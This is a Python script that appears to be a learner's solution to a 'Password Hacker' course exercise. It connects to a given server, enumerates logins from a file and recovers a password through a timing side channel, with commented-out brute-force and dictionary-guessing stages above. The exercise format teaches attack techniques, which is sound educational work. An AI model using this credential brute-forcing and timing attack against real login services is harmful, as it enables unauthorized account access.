# write your code here
import argparse
import socket
import sys
import string
import itertools
import json
import time

args = sys.argv

client_socket = socket.socket()
host = args[1]
port = int(args[2])
address = (host, port)
client_socket.connect(address)



#guessing password

#chars = string.ascii_lowercase + '0123456789'
#length = 1
#while length < 10:
#    for i in itertools.product(chars, repeat=length):
#        password = ''
#        for ch in i:
#            password += ch
#        client_socket.send(password.encode())
#        response = client_socket.recv(1024)
#        response = response.decode()
#        if response == 'Connection success!':
 #           print(password)
#            exit()
#    length += 1

#guessing password using dictionary
#file = open('C:\\Users\\mi\\Desktop\\prog files\\jetbrains python\\Password Hacker\\.idea\\passwords.txt', 'r')
#
#for line in file:
#    pswrd = line.replace('\n', '')
#
#    variants = zip(pswrd.lower(), pswrd.upper())
#
#    for vars_pswrd in itertools.product(*variants):
#        password = ''
#        for ch in vars_pswrd:
#            password += ch
#        #print(password)


#        client_socket.send(password.encode())
#        response = client_socket.recv(1024)
#        response = response.decode()
#        if response == 'Connection success!':
#            print(password)
#            file.close()
#            exit()

#stage with json(4)
#file = open('C:\\Users\\mi\\Desktop\\prog files\\jetbrains python\\Password Hacker\\.idea\\logins.txt', 'r')
#login = ""
#while login == "":
#    for line in file:
#        user = line.replace('\n', '')
#        json_str_userinfo = json.dumps({"login": user, "password": " "})
#        client_socket.send(json_str_userinfo.encode())
#        response = client_socket.recv(1024)
#        response = response.decode()
#        if json.loads(response)["result"] == "Wrong password!":
#            login = user
#            #print(login)
#            break

#length = 1
#password = ''
#while length:
#
#    chars = string.ascii_letters + string.digits + string.punctuation
#    for i in itertools.product(chars, repeat=length):
#        ch = i[0]
#        password += ch
#        #print(password)
#        json_str_userinfo = json.dumps({"login": user, "password": password})
#        client_socket.send(json_str_userinfo.encode())
#        response = client_socket.recv(1024)
#        response = response.decode()

            #print('sent:', password)

 #       if json.loads(response)["result"] != "Exception happened during login":
 #           password = password[:-1]

#        if json.loads(response)["result"] == "Connection success!":
 #           print(json_str_userinfo)
#
 #           exit()

#stage with time(5)
file = open('C:\\Users\\mi\\Desktop\\prog files\\jetbrains python\\Password Hacker\\.idea\\logins.txt', 'r')
login = ""
while login == "":
    for line in file:
        user = line.replace('\n', '')
        json_str_userinfo = json.dumps({"login": user, "password": " "})
        client_socket.send(json_str_userinfo.encode())
        response = client_socket.recv(1024)
        response = response.decode()
        if json.loads(response)["result"] == "Wrong password!":
            login = user
            #print(login)
            break


password = ''
chars = string.ascii_letters + string.digits + string.punctuation
total_time = 0
for i in chars:
    json_str_userinfo = json.dumps({"login": user, "password": i})
    start = time.perf_counter()
    client_socket.send(json_str_userinfo.encode())
    response = client_socket.recv(1024)
    end = time.perf_counter()
    response = response.decode()
    total_time_resp = end - start
#    print(i, total_time_resp)
    total_time += total_time_resp
#print(total_time)
avg_time = total_time / len(chars)
#print('avg:', avg_time)

#print('here checking stops')
while True:


    #for i in itertools.product(chars, repeat=length):

    for i in itertools.cycle(chars):
        ch = i[0]
        password += ch
        #print('current', password)
        json_str_userinfo = json.dumps({"login": user, "password": password})
        start = time.perf_counter()
        client_socket.send(json_str_userinfo.encode())
        response = client_socket.recv(1024)
        end = time.perf_counter()
        response = response.decode()
        time_for_ch = end - start
        #print(total_time)
        #print("cur_pswrd", password)

            #print('sent:', password)

        if json.loads(response)["result"] == "Wrong password!" and time_for_ch < avg_time:
            password = password[:-1]

        elif json.loads(response)["result"] == "Wrong password!" and time_for_ch > avg_time:
            #print('found', password)
            pass

        elif json.loads(response)["result"] == "Connection success!":
            print(json_str_userinfo)
            exit()

client_socket.close
